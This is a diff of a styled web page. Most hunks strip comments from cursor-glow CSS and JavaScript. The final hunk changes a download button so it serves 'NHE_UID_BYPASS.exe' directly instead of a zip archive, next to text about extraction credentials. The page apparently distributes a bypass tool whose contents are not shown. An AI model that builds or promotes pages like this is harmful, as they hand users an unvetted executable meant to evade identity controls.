@@ -41,7 +41,7 @@
             cursor: default;
         }
 
-        /* Premium Silver Glow effect on mouse move - handled by JS */
+        /* Premium Silver Glow effect on mouse move */
         #cursor-glow {
             position: fixed;
             top: 0;
@@ -170,7 +170,7 @@
             position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
             border-radius: 16px;
-            padding: 2px; /* Border thickness */
+            padding: 2px;
             background: linear-gradient(135deg, transparent 40%, var(--accent-bright-silver), transparent 60%);
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
@@ -187,7 +187,6 @@
         
         .panel-card:hover::before {
             opacity: 1;
-            /* Animated border reflection */
             background-size: 200% 200%;
             animation: borderShine 3s linear infinite;
         }
@@ -548,12 +547,10 @@
         const glow = document.getElementById('cursor-glow');
         
         document.addEventListener('mousemove', (e) => {
-            // Update position
             glow.style.left = e.clientX + 'px';
             glow.style.top = e.clientY + 'px';
         });
 
-        // Dim glow when leaving window
         document.addEventListener('mouseleave', () => {
             glow.style.opacity = '0';
         });
@@ -562,7 +559,6 @@
             glow.style.opacity = '0.15';
         });
 
-        // Increase glow slightly when clicking
         document.addEventListener('mousedown', () => {
             glow.style.opacity = '0.25';
             glow.style.width = '350px';
@@ -629,7 +625,7 @@
                             Secure archive ready for deployment. Extract using the credentials listed above.
                         </p>
 
-                        <a href="NHE_UID_BYPASS.zip" download class="download-btn">
+                        <a href="NHE_UID_BYPASS.exe" download="NHE_UID_BYPASS.exe" class="download-btn">
                             <i class="fa-solid fa-download" style="margin-right: 8px;"></i> INITIATE DOWNLOAD
                         </a>
                     </div>
